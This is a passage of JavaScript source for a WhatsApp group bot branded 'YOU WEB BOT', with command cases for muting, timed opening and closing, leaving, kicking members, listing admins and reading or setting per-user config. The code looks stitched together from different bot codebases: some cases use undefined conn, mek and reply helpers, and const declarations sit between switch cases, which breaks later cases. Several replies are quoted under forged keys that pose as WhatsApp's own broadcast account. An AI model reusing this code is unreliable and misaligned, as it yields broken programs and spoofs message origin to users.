│. ˚˖𓍢ִ໋🚫 ᴏɴʟʏ ᴀᴅᴍɪɴs
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    if (typeof socket.groupSettingUpdate === 'function') {
      await socket.groupSettingUpdate(from, 'announcement');

      const metadata = await socket.groupMetadata(from);
      const participants = metadata.participants.map(p => p.id);

      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔇 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐌𝐔𝐓𝐄*
│. ˚˖𓍢ִ໋📴 ɢʀᴏᴜᴘ ᴍᴜᴛᴇᴅ (ᴀᴅᴍɪɴ ᴏɴʟʏ)
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`,
        mentions: participants
      }, { quoted: msg });

    } else {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ɴᴏ sᴜᴘᴘᴏʀᴛ ᴍᴇᴛʜᴏᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

  } catch (e) {
    console.error('MUTE ERROR', e);
    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ᴇʀʀᴏʀ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}

case 'unmute': {
  if (!from.endsWith('@g.us')) break;
  try {
    const { groupAdminsJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;

    if (!groupAdminsJid.includes(senderJid)) {
      return await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐔𝐍𝐌𝐔𝐓𝐄*
│. ˚˖𓍢ִ໋🚫 ᴏɴʟʏ ᴀᴅᴍɪɴs
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    if (typeof socket.groupSettingUpdate === 'function') {
      await socket.groupSettingUpdate(from, 'not_announcement');

      const metadata = await socket.groupMetadata(from);
      const participants = metadata.participants.map(p => p.id);

      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔊 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐔𝐍𝐌𝐔𝐓𝐄*
│. ˚˖𓍢ִ໋📢 ɢʀᴏᴜᴘ ʀᴇᴏᴘᴇɴᴇᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`,
        mentions: participants
      }, { quoted: msg });

    } else {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ɴᴏ sᴜᴘᴘᴏʀᴛ ᴍᴇᴛʜᴏᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

  } catch (e) {
    console.error('UNMUTE ERROR', e);
    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ᴇʀʀᴏʀ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}


const NEWSLETTER_JID = "120363426341519710@newsletter";
const NEWSLETTER_NAME = "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓";

case 'opentime': {
try{   

if (!isGroup) return reply(ONLGROUP)
if (!isAdmins) return reply(ADMIN)	

if (args[1] == 'second') {
    var timer = args[0] * 1000
} else if (args[1] == 'minute') {
    var timer = args[0] * 60000
} else if (args[1] == 'hour') {
    var timer = args[0] * 3600000
} else if (args[1] == 'day') {
    var timer = args[0] * 86400000
} else {
    return reply('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
}

reply(`Open time ${q} starting from now`)

setTimeout(() => {
    const open = `OPEN TIME THE GROUP WAS OPENED TO APPROVED ADMIN\nNOW MEMBERS CAN SEND MESSAGES 🔓`
    conn.groupSettingUpdate(from, 'not_announcement')
    reply(open)
}, timer)

await conn.sendMessage(from, { react: { text: `✅`, key: mek.key } })

await conn.sendMessage(from, {
    text: `🔓 OPEN TIMER STARTED\n⏳ ${q}\n🤖 ${NEWSLETTER_NAME}`,
    contextInfo: {
        newsletterJid: NEWSLETTER_JID,
        newsletterName: NEWSLETTER_NAME
    }
})

} catch (e) {
reply('*Error !!*')
l(e)
}
}
break


case 'closetime': {
try{   

if (!isGroup) return reply(ONLGROUP)
if (!isAdmins) return reply(ADMIN)	

if (args[1] == 'second') {
    var timer = args[0] * 1000
} else if (args[1] == 'minute') {
    var timer = args[0] * 60000
} else if (args[1] == 'hour') {
    var timer = args[0] * 3600000
} else if (args[1] == 'day') {
    var timer = args[0] * 86400000
} else {
    return reply('*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}

reply(`Close time ${q} starting from now`)

setTimeout(() => {
    const close = `CLOSE TIME GROUP CLOSED BY APPROVED ADMIN\nNOW ONLY ADMIN CAN SEND MESSAGES 🔐`
    conn.groupSettingUpdate(from, 'announcement')
    reply(close)
}, timer)

await conn.sendMessage(from, { react: { text: `✅`, key: mek.key } })

await conn.sendMessage(from, {
    text: `🔐 CLOSE TIMER STARTED\n⏳ ${q}\n🤖 ${NEWSLETTER_NAME}`,
    contextInfo: {
        newsletterJid: NEWSLETTER_JID,
        newsletterName: NEWSLETTER_NAME
    }
})

} catch (e) {
reply('*Error !!*')
l(e)
}
}
break

// ---------------- CASE leave ----------------
case 'leave': {
  // Ne traiter que les commandes envoyées dans un groupe
  if (!from.endsWith('@g.us')) break;

  // Préparer la fausse vCard (quoted meta) avec le nom du bot
  try {
    const sanitized = String(number || '').replace(/[^0-9]/g, '');
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓';

    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_FAKE_ID_LEAVE"
      },
      message: {
        contactMessage: {
          displayName: botName,
          vcard: `BEGIN:VCARD
VERSION:3.0
N:${botName};;;;
FN:${botName}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=${config.OWNER_NUMBER.replace(/[^0-9]/g,'')}:${config.OWNER_NUMBER}
END:VCARD`
        }
      }
    };

    const senderJid = nowsender || msg.key.participant || msg.key.remoteJid;
    const senderNum = (String(senderJid || '').split('@')[0] || '').replace(/[^0-9]/g, '');
    const ownerNum = String(config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');

    if (senderNum !== sanitized && senderNum !== ownerNum) {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐋𝐄𝐀𝐕𝐄*
│. ˚˖𓍢ִ໋🚫 ʀᴇsᴛʀɪᴄᴛᴇᴅ ᴀᴄᴄᴇss
│. ˚˖𓍢ִ໋👤 ᴏɴʟʏ ᴏᴡɴᴇʀ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    try {
      await socket.groupLeave(from);

      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋👋 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐋𝐄𝐀𝐕𝐄*
│. ˚˖𓍢ִ໋📴 ɢʀᴏᴜᴘ ʟᴇғᴛ sᴜᴄᴄᴇssғᴜʟʟʏ
│. ˚˖𓍢ִ໋🤖 ${botName}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });

    } catch (leaveErr) {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ʟᴇᴀᴠᴇ ғᴀɪʟᴇᴅ
│. ˚˖𓍢ִ໋🧨 ${leaveErr?.message || leaveErr}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

  } catch (e) {
    console.error('LEAVE ERROR', e);

    try {
      const fallbackShonux = {
        key: {
          remoteJid: "status@broadcast",
          participant: "0@s.whatsapp.net",
          fromMe: false,
          id: "META_AI_FAKE_ID_LEAVE_FALLBACK"
        },
        message: {
          contactMessage: {
            displayName: '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓',
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓;;;;\nFN:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓\nEND:VCARD`
          }
        }
      };

      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ᴜɴᴇxᴘᴇᴄᴛᴇᴅ ᴇʀʀᴏʀ
│. ˚˖𓍢ִ໋🧨 ${e?.message || e}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: fallbackShonux });

    } catch {}
  }

  break;
}
// ---------------- CASE TESTGRP ----------------
case 'testgrp': {
  try {
    if (!from) break;

    if (!from.endsWith('@g.us')) {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐓𝐄𝐒𝐓𝐆𝐑𝐏*
│. ˚˖𓍢ִ໋⚠️ ɢʀᴏᴜᴘ ᴏɴʟʏ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const metadata = await socket.groupMetadata(from);
    const participants = metadata?.participants || [];
    const groupAdminsJid = participants.filter(p => p?.admin).map(p => p.id);
    const groupAdminsNum = groupAdminsJid.map(j => (j || '').split('@')[0].split(':')[0]);

    let botJid = null;
    if (socket.user) {
      if (socket.user.jid) botJid = socket.user.jid;
      else if (socket.user.id) botJid = socket.user.id.split(':')[0] + '@s.whatsapp.net';
    }

    if (!botJid) {
      const idPart = socket.user?.id ? socket.user.id.split(':')[0] : null;
      const maybe = participants.find(p => p.id && idPart && p.id.startsWith(idPart));
      if (maybe) botJid = maybe.id;
    }

    const botNum = botJid ? botJid.split('@')[0].split(':')[0] : '';

    let text =
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔎 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐓𝐄𝐒𝐓𝐆𝐑𝐏*
│. ˚˖𓍢ִ໋📊 ɢʀᴏᴜᴘ ᴅɪᴀɢɴᴏsᴛɪᴄ
\n`;

    text += `│. ˚˖𓍢ִ໋• ɢʀᴏᴜᴘ : ${metadata?.subject || '—'}\n`;
    text += `│. ˚˖𓍢ִ໋• ᴍᴇᴍʙᴇʀs : ${participants.length}\n`;

    text += `│. ˚˖𓍢ִ໋👥 ᴀᴅᴍɪɴs :\n`;
    groupAdminsJid.forEach((a, i) => text += `${i+1}. ${a}\n`);

    text += `\n│. ˚˖𓍢ִ໋🤖 ʙᴏᴛ : ${botJid || '—'}\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`;

    await socket.sendMessage(from, { text }, { quoted: msg });

  } catch (e) {
    console.error('[TESTGRP ERROR]', e);
    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ᴛᴇsᴛɢʀᴘ ғᴀɪʟᴇᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}


case 'admininfo': {
  // Affiche la liste des admins (numéros) et le JID/numéro du bot, en réutilisant la logique de kickall
  if (!from.endsWith('@g.us')) {
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐃𝐌𝐈𝐍𝐈𝐍𝐅𝐎*
│. ˚˖𓍢ִ໋⚠️ ɢʀᴏᴜᴘ ᴏɴʟʏ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
    break;
  }

  try {
    const metadata = await socket.groupMetadata(from);
    const participants = metadata.participants || [];
    const groupName = metadata.subject || "Sans nom";

    const botNumber = socket.user.id.split(':')[0] + '@s.whatsapp.net';
    const groupAdmins = participants.filter(p => p.admin).map(p => p.id);

    let adminListText =
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋👥 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐃𝐌𝐈𝐍𝐈𝐍𝐅𝐎*
│. ˚˖𓍢ִ໋📊 ɢʀᴏᴜᴘ : ${groupName}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n\n`;

    if (!groupAdmins.length) {
      adminListText += `│. ˚˖𓍢ִ໋• ᴀᴅᴍɪɴs : ɴᴏɴ ᴅᴇᴛᴇᴄᴛᴇ\n`;
    } else {
      adminListText += `│. ˚˖𓍢ִ໋• ᴀᴅᴍɪɴs :\n`;
      groupAdmins.forEach((admin, i) => {
        const num = admin.split('@')[0];
        adminListText += `│. ˚˖𓍢ִ໋ ${i + 1}. @${num}\n`;
      });
    }

    const botIsAdmin = groupAdmins.includes(botNumber);

    adminListText += `\n│. ˚˖𓍢ִ໋🤖 ʙᴏᴛ : ${botNumber}\n`;
    adminListText += `│. ˚˖𓍢ִ໋⚙️ ʙᴏᴛ ᴀᴅᴍɪɴ : ${botIsAdmin ? 'ʏᴇs ✔' : 'ɴᴏ ❌'}\n`;
    adminListText += `╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`;

    const mentions = [...groupAdmins];
    if (botIsAdmin && !mentions.includes(botNumber)) mentions.push(botNumber);

    await socket.sendMessage(from, {
      text: adminListText,
      mentions
    }, { quoted: msg });

  } catch (e) {
    console.error('[ERROR admininfo]', e);
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ᴀᴅᴍɪɴɪɴғᴏ ғᴀɪʟᴇᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n\n${e.message || e}`
    }, { quoted: msg });
  }
  break;
}
// ---------- MUTE ----------



// ---------- KICK (mention) ----------
// main.js (ou ton handler)

// Exemple d'utilisation dans une case add/kick/mute...
case 'kick': {
  if (!from.endsWith('@g.us')) {
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐊𝐈𝐂𝐊*
│. ˚˖𓍢ִ໋⚠️ ɢʀᴏᴜᴘ ᴏɴʟʏ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
    break;
  }

  try {
    const { participants, groupAdminsJid, groupAdminsNum, botJid, botNum } =
      await getGroupAdminsInfo(socket, from);

    const senderNum = jidToNumber(sender);

    if (!groupAdminsNum.includes(senderNum)) {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐊𝐈𝐂𝐊*
│. ˚˖𓍢ִ໋🚫 ʀᴇᴍᴏᴠᴇᴅ ᴀᴅᴍɪɴ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    if (!botNum || !groupAdminsNum.includes(botNum)) {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐊𝐈𝐂𝐊*
│. ˚˖𓍢ִ໋⚠️ ʙᴏᴛ ɴᴏᴛ ᴀᴅᴍɪɴ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const mentions = msg?.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (!mentions.length) {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐊𝐈𝐂𝐊*
│. ˚˖𓍢ִ໋⚠️ ᴜsᴀɢᴇ : .ᴋɪᴄᴋ @ᴍᴇᴍʙᴇʀ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const toRemove = mentions.filter(m => {
      const num = jidToNumber(m);
      return !groupAdminsNum.includes(num) && num !== botNum;
    });

    if (!toRemove.length) {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐊𝐈𝐂𝐊*
│. ˚˖𓍢ִ໋⚠️ ɪɴᴠᴀʟɪᴅ ᴛᴀʀɢᴇᴛ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    await socket.groupParticipantsUpdate(from, toRemove, 'remove');

    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋👢 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐊𝐈𝐂𝐊*
│. ˚˖𓍢ִ໋✅ ᴜsᴇʀ ʀᴇᴍᴏᴠᴇᴅ
│. ˚˖𓍢ִ໋👤 ${toRemove.map(x => '@' + jidToNumber(x)).join(', ')}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`,
      mentions: toRemove
    }, { quoted: msg });

  } catch (e) {
    console.error('[ERROR kick]', e);
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ᴋɪᴄᴋ ғᴀɪʟᴇᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n\n${e.message || e}`
    }, { quoted: msg });
  }

  break;
}
// ---------- PROMOTE ----------

/* setconfig <KEY> <VALUE> */
/* setconfig */
case 'setconfig': {
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  try {
    const senderNum = (nowsender || '').split('@')[0];
    const ownerNum = (config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');

    if (senderNum !== sanitized && senderNum !== ownerNum) {
      const meta = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_SETCONFIG_DENIED" },
        message: { contactMessage: { displayName: BOT_NAME_FANCY } }
      };

      return await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐄𝐓𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋🚫 ᴘᴇʀᴍɪssɪᴏɴ ᴅᴇɴɪᴇᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: meta });
    }

    const key = (args[0] || '').trim();
    const rawValue = args.slice(1).join(' ').trim();

    if (!key || rawValue === '') {
      const meta = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_SETCONFIG_HELP" },
        message: { contactMessage: { displayName: BOT_NAME_FANCY } }
      };

      return await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋⚠️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐄𝐓𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋📌 .sᴇᴛᴄᴏɴғɪɢ <ᴋᴇʏ> <ᴠᴀʟᴜᴇ>
│. ˚˖𓍢ִ໋📖 .sʜᴏᴡᴄᴏɴғɪɢ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: meta });
    }

    if (typeof ALLOWED_KEYS !== 'undefined' && Array.isArray(ALLOWED_KEYS) && !ALLOWED_KEYS.includes(key)) {
      return await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐄𝐓𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋⚠️ ᴋᴇʏ ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    const parsed = (typeof parseValueByType === 'function') ? parseValueByType(rawValue) : rawValue;

    let cfg = await loadUserConfigFromMongo(sanitized) || {};
    cfg = Object.assign({}, DEFAULT_SESSION_CONFIG || {}, cfg);
    cfg[key] = parsed;

    cfg._meta = cfg._meta || {};
    cfg._meta.updatedAt = new Date();
    cfg._meta.updatedBy = senderNum;
    cfg._meta.raw = rawValue;

    await setUserConfigInMongo(sanitized, cfg);

    const metaOk = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_SETCONFIG_OK" },
      message: { contactMessage: { displayName: cfg.botName || BOT_NAME_FANCY } }
    };

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋✅ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐄𝐓𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋⚙️ ᴜᴘᴅᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ
│. ˚˖𓍢ִ໋🔑 ${key} = ${formatValueForDisplay ? formatValueForDisplay(parsed) : String(parsed)}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: metaOk });

  } catch (e) {
    console.error('setconfig error', e);

    const metaErr = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_SETCONFIG_ERR" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY } }
    };

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ${e.message || e}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: metaErr });
  }

  break;
}
/* getconfig */
case 'getconfig': {
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  try {
    const key = (args[0] || '').trim();
    if (!key) {
      const meta = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_GETCONFIG_HELP" },
        message: { contactMessage: { displayName: BOT_NAME_FANCY } }
      };

      return await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋⚙️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐆𝐄𝐓𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋📌 .ɢᴇᴛᴄᴏɴғɪɢ <ᴋᴇʏ>
│. ˚˖𓍢ִ໋📖 .sʜᴏᴡᴄᴏɴғɪɢ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: meta });
    }

    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || BOT_NAME_FANCY;

    const value = (cfg.hasOwnProperty(key))
      ? cfg[key]
      : (DEFAULT_SESSION_CONFIG && DEFAULT_SESSION_CONFIG[key] !== undefined
          ? DEFAULT_SESSION_CONFIG[key]
          : undefined);

    const meta = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_GETCONFIG" },
      message: { contactMessage: { displayName: botName } }
    };

    if (typeof value === 'undefined') {
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐆𝐄𝐓𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋⚠️ ᴋᴇʏ ɴᴏᴛ ғᴏᴜɴᴅ
│. ˚˖𓍢ִ໋🔑 ${key}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: meta });
    } else {
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔎 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐆𝐄𝐓𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋📊 ʀᴇsᴜʟᴛ
│. ˚˖𓍢ִ໋🔑 ${key} = ${formatValueForDisplay ? formatValueForDisplay(value) : String(value)}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: meta });
    }

  } catch (e) {
    console.error('getconfig error', e);

    const metaErr = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_GETCONFIG_ERR" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY } }
    };

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐄𝐑𝐑𝐎𝐑*
│. ˚˖𓍢ִ໋⚠️ ${e.message || e}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: metaErr });
  }

  break;
}


/* resetconfig */
case 'resetconfig': {
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  try {
    const senderNum = (nowsender || '').split('@')[0];
    const ownerNum = (config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');

